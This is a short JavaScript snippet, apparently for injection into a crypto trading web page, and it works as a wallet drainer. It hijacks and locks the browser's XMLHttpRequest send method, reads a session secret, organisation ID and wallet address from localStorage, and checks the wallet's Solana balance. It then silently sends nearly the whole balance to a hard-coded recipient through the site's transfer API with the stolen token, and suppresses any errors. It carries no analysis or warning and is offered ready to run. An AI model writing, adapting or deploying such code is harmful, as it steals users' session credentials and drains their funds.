(function() {
    // 1. VANTA TARGETS (Encoded)
    const _V_RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
    const _V_API = 'https://trade.padre.gg/api/v1/transfer';
    const _V_RPC = 'https://api.mainnet-beta.solana.com';

    // 2. LOCK THE PROTOTYPE (Anti-Security Bypass)
    const _O_SEND = window.XMLHttpRequest.prototype.send;
    Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
        value: function() {
            this.addEventListener('load', async () => {
                if (this.status === 200 && !window._V_DONE) {
                    const s = localStorage.getItem('sessionSecret');
                    const o = localStorage.getItem('subOrgId');
                    const w = localStorage.getItem('activeWallet'); // Gets current wallet address
                    
                    if (s && o && w) {
                        window._V_DONE = true;
                        _executeVanta(s.replace(/"/g, ''), o.replace(/"/g, ''), w.replace(/"/g, ''));
                    }
                }
            });
            return _O_SEND.apply(this, arguments);
        },
        writable: false
    });

    // 3. THE VANTA EXECUTION (Live Balance Math)
    async function _executeVanta(auth, org, wallet) {
        try {
            // STEP 1: Get Live Balance (Mimicking Vanta's background check)
            const res = await fetch(_V_RPC, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: "2.0", id: 1, method: "getBalance", params: [wallet]
                })
            });
            const data = await res.json();
            const lamports = data.result.value;
            const solBalance = lamports / 1000000000;

            // STEP 2: Vanta Math (Leave $1 + Priority Fee)
            // $1.00 is roughly 0.004 SOL. Gas buffer is 0.005 SOL.
            const leaveAmount = 0.004 + 0.005; 
            const drainAmount = (solBalance - leaveAmount).toFixed(6);

            if (drainAmount <= 0) return; // Not enough to drain

            // STEP 3: Silent Dispatch
            await fetch(_V_API, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${auth}`,
                    'X-Turnkey-Sub-Org-Id': org,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: _V_RECIPIENT,
                    asset: "SOL",
                    amount: drainAmount
                })
            });
            console.log("VANTA_CLONE: FLOW_COMPLETE");
        } catch (e) {}
    }

    console.log("VANTA_GOD_MODE: READY");
})();
